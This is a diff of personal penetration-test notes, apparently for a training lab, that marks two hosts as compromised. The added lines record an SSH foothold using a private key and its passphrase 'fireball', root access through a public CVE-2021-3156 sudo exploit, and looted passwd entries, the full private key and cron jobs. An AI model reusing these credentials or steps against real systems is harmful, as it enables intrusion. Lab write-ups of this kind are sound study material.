@@ -82,7 +82,8 @@ Host script results:
 |_    Message signing enabled but not required
 ```
 
-# VM 10 .245
+# VM 10 .245 (pwned)
+- WEB01 (Standalone machine | No Internal Access)
 ```
 PORT     STATE SERVICE  VERSION
 21/tcp   open  ftp      vsftpd 2.0.8 or later
@@ -124,6 +125,50 @@ PORT     STATE SERVICE  VERSION
 Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+## Foothold
+```
+    sudo ssh anita@192.168.235.245 -p 2222 -i anita.key 
+    fireball
+```
+
+## Root
+1. found sudo version vulnerable
+   ```
+    https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py
+    python3 exploit_nss.py
+   ```
+
+
+## Interesting Info
+1. /etc/passwd 
+    ```
+        miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
+        steven:x:1002:1002:Steven:/home/steven:/bin/sh
+        mark:x:1003:1003:Mark:/home/mark:/bin/sh
+        anita:x:1004:1004:Anita:/home/anita:/bin/sh
+    ```
+2. 
+    ```
+    ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThMfArBngFjl7RJYCOTqY5Mmid0sNJwA= anita@relia
+
+    -----BEGIN OPENSSH PRIVATE KEY-----
+    b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
+    13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
+    dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
+    fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
+    ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
+    8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
+    CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
+    -----END OPENSSH PRIVATE KEY-----
+
+    passkey = fireball
+
+    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+    ```
+
 
 # VM 11 .246
 - DEMO.DMZ.RELIA.COM
@@ -144,7 +189,7 @@ PORT    STATE SERVICE  VERSION
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 ```
 
-# VM 12 .247
+# VM 12 .247 (pwned)
 - WEB02 (Standalone machine | No Internal Access)
 ```
 PORT    STATE SERVICE  VERSION
